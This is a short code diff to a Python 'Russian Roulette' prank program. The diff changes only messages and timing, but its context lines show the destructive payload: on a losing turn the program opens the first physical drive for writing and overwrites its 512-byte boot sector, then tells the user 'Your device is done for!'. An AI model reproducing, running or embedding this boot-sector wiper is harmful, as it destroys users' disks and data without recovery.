@@ -53,7 +53,7 @@ def status(stat):
             hDevice = CreateFileW("\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, None, OPEN_EXISTING, 0,0)
             WriteFile(hDevice, AllocateReadBuffer(512), None)
             CloseHandle(hDevice)
-        MessageBox("Your device is done for! Enjoy while it lasts.", "Russian Roulette!", MB_ICONWARNING)       
+        MessageBox("BANG!!\n You fired the bullet! Your device is done for! Enjoy while it lasts.", "HEADSHOT!", MB_ICONWARNING)       
 
     else:
         MessageBox("You survived, lets see how far you can go.", "Russian Roulette!", MB_ICONWARNING)
@@ -86,7 +86,9 @@ def sendAndRecieve(msgs) -> None:
 def russian_roulette():
     global current_chamber
 
-    input("Press enter to pull the trigger.")
+    print("Spinning the cylinder!")
+    time.sleep(3)
+    input("*Pointing at your head*, Press enter to pull the trigger.")
     
     if bullet_chamber == current_chamber:
         return True
